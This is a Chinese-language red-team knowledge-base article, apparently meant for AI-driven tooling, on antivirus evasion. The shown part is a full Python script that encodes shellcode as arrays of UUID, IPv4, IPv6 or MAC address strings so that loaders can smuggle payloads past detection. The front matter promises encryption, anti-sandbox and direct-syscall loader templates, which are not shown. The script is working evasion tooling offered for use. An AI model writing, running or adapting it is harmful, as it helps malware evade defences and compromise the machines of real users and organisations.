---
id: "pe-reverse/09-av-evasion/01-ai-powered-evasion"
title: "AI 驱动免杀：Shellcode 处理 + Loader 编写"
title_en: "AI-Driven Antivirus Evasion: Shellcode Processing + Loader Development"
summary: >
  全链路免杀方案：从 shellcode 同义指令替换和花指令注入（Patch）、多层加密（XOR/RC4/S-Box）、UUID/IPv4/MAC 混淆伪装，到反沙箱/VEH/Syscall Loader 模板编写，附编译命令参考和验证闭环标准。
summary_en: >
  End-to-end AV evasion pipeline: from shellcode synonym replacement and junk injection (Patch), multi-layer encryption (XOR/RC4/S-Box), UUID/IPv4/MAC obfuscation camouflage, to anti-sandbox/VEH/syscall Loader template development, with compilation reference and verification criteria.
board: "pe-reverse"
category: "09-av-evasion"
signals:
  - "shellcode encryption"
  - "obfuscation"
  - "anti-sandbox"
  - "VEH"
  - "direct syscall"
  - "免杀"
  - "Loader"
  - "花指令"
mcp_tools:
  - run_ctf_tool
  - triage_pe
  - patch_pe_bytes
  - ghidra_headless_analyze
  - extract_iocs_from_summary
  - hash_file
  - make_yara_stub
keywords:
  - "AV evasion"
  - "shellcode"
  - "encryption"
  - "obfuscation"
  - "loader"
  - "anti-sandbox"
  - "syscall"
  - "VEH"
  - "XOR"
  - "UUID"
difficulty: "advanced"
tags:
  - "AV-evasion"
  - "shellcode"
  - "loader"
  - "obfuscation"
  - "anti-sandbox"
  - "syscall"
  - "encryption"
  - "red-team"
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# AI 驱动免杀：Shellcode 处理 + Loader 编写

> 本篇：Shellcode 混淆 + Loader 模板（第 3–4 节）。
> 续篇：`03-attack-chain-and-verification.md`。

## 3. Shellcode 混淆 — 伪装数据类型

```python
# scripts/windows/av-evasion/shellcode-obfuscate.py
"""
将 shellcode 伪装成 UUID / IPv4 / IPv6 / MAC 地址数组。
"""
import sys, uuid, struct, ipaddress


def to_uuid_array(data: bytes) -> list[str]:
    """16 字节一组伪装成 UUID 字符串"""
    uuids = []
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        if len(chunk) < 16:
            chunk = chunk + b'\x00' * (16 - len(chunk))
        uuids.append(str(uuid.UUID(bytes_le=chunk)))
    return uuids


def to_ipv4_array(data: bytes) -> list[str]:
    """4 字节一组伪装成 IPv4 地址"""
    ips = []
    for i in range(0, len(data), 4):
        chunk = data[i:i+4]
        if len(chunk) < 4:
            chunk = chunk + b'\x00' * (4 - len(chunk))
        ips.append(str(ipaddress.IPv4Address(chunk)))
    return ips


def to_ipv6_array(data: bytes) -> list[str]:
    """16 字节一组伪装成 IPv6 地址"""
    ips = []
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        if len(chunk) < 16:
            chunk = chunk + b'\x00' * (16 - len(chunk))
        ips.append(str(ipaddress.IPv6Address(chunk)))
    return ips


def to_mac_array(data: bytes) -> list[str]:
    """6 字节一组伪装成 MAC 地址"""
    macs = []
    for i in range(0, len(data), 6):
        chunk = data[i:i+6]
        if len(chunk) < 6:
            chunk = chunk + b'\x00' * (6 - len(chunk))
        macs.append(':'.join(f'{b:02x}' for b in chunk).upper())
    return macs


FORMATS = {
    'uuid':  (to_uuid_array,  'char*', 'UuidDeobfuscate'),
    'ipv4':  (to_ipv4_array,  'char*', 'Ipv4Deobfuscate'),
    'ipv6':  (to_ipv6_array,  'char*', 'Ipv6Deobfuscate'),
    'mac':   (to_mac_array,   'char*', 'MacDeobfuscate'),
    # Combo: 多种格式混合, 每种随机选
    'combo': (None,           'char*', 'ComboDeobfuscate'),
}


def to_c_array(items: list[str], name: str = "obfuscated") -> str:
    body = '\n'.join(f'    "{item}",' for item in items)
    return (
        f'// {len(items)} items\n'
        f'char* {name}[] = {{\n{body}\n}};\n'
        f'unsigned int {name}_count = {len(items)};\n'
    )


def main():
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <shellcode.bin> [format=uuid|ipv4|ipv6|mac|combo]")
        sys.exit(1)

    in_file = sys.argv[1]
    fmt = sys.argv[2] if len(sys.argv) > 2 else 'uuid'

    with open(in_file, 'rb') as f:
        data = f.read()

    print(f"[*] Input:  {len(data)} bytes")
    print(f"[*] Format: {fmt}")

    if fmt == 'combo':
        # 混合格式: 随机选 UUID/IPv4/MAC
        combiners = {'uuid': to_uuid_array, 'ipv4': to_ipv4_array, 'mac': to_mac_array}
        all_items = []
        pos = 0
        while pos < len(data):
            f_choice = random.choice(list(combiners.keys()))
            chunk_sizes = {'uuid': 16, 'ipv4': 4, 'mac': 6}
            size = chunk_sizes[f_choice]
            chunk = data[pos:pos+size]
            if len(chunk) < size:
                chunk = chunk + b'\x00' * (size - len(chunk))
            fn = combiners[f_choice]
            items = fn(chunk)
            all_items.extend(items)
            pos += size
        result_fn = 'to_combo_array'
    else:
        fn, _, _ = FORMATS.get(fmt, FORMATS['uuid'])
        all_items = fn(data)
        result_fn = f'to_{fmt}_array'

    c_code = to_c_array(all_items, f'payload_{fmt}')
    out_file = in_file.replace('.bin', f'_obfuscated_{fmt}.c')
    with open(out_file, 'w') as f:
        f.write(c_code)
    print(f"[+] Output: {out_file}")


if __name__ == '__main__':
    import random
    main()
```

---
